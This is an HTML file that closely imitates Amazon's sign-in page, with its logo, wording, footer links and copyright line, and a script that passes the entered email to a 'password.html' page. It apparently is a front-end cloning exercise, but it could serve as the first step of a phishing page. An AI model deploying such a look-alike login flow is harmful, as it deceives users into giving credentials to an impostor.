<!DOCTYPE html>
<html>
<head>
    <title>Sign In</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
</head>

<body>

<div class="page">
    <div class="logo">
        <img src="amazon_pic.png" alt="Amazon Logo">
    </div>
    
    <div class="login-box">
        <h2>Sign in or create account</h2>

        <label for="email" class="bold-label">Enter email or mobile number</label>
        <input type="text" 
        id="email" 
        name="email"
        class="email-input"
        required>
        
        <button id="continueBtn" type="button">Continue</button>

    <p style="font-weight: normal;">
        By continuing, you agree to Amazon'S <a href="https://www.amazon.com/gp/help/customer/display.html/ref=ap_signin_notification_condition_of_use?nodeId=GLSBYFE9MGKKQXXM&ie=UTF8&ref_=ap_signin_notification_condition_of_use" >Conditions of Use</a> and <a href="https://www.amazon.com/gp/help/customer/display.html/ref=ap_signin_notification_privacy_notice?nodeId=GX7NJQ4ZB8MHFRNJ&ie=UTF8&ref_=ap_signin_notification_privacy_notice" >Privacy Notice</a>. </p>
    <p class="need-help">
         <a href="https://www.amazon.com/gp/help/customer/account-issues/ref=unified_claim_collection?ie=UTF8" style="text-decoration: none ;" >Need help?</a></p>

        <hr>

    <h3 > Buying for work?</h3>
    
    <a href="https://www.amazon.com/business/register/org/landing?ref_=ab_reg_signin_unifiedauth" class="business" style="text-decoration: none;" >Create a free business account</a>

    </div>
    <hr class="box-bottom-line">    
</div>


<div class="footer">
<a href = "https://www.amazon.com/gp/help/customer/display.html/ref=ap_signin_notification_condition_of_use?nodeId=GLSBYFE9MGKKQXXM&ie=UTF8&ref_=ap_signin_notification_condition_of_use" style="text-decoration: none;" >Conditions of Use</a>
<a href = "https://www.amazon.com/gp/help/customer/display.html/ref=ap_signin_notification_privacy_notice?nodeId=GX7NJQ4ZB8MHFRNJ&ie=UTF8&ref_=ap_signin_notification_privacy_notice" style="text-decoration: none;" >Privacy Notice</a>
<a href = "https://www.amazon.com/gp/help/customer/account-issues/ref=unified_claim_collection?ie=UTF8" style="text-decoration: none;" >Help</a>
</div>


<div class="trade-mark">
<p> © 1996-2026, Amazon.com, Inc. or its affiliates</p>
</div>



<script>
    document
    .getElementById("continueBtn")
    .addEventListener("click", function() {
        
        const email = 
        document
        .getElementById("email").value
        .trim();

        const isValidEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
        
        if (email && isValidEmail) {
            window.location.href = 
            "password.html?email=" + encodeURIComponent(email);

        } else {
            alert("Please enter a valid email address");
        }
    });








</script>

</body>
</html>
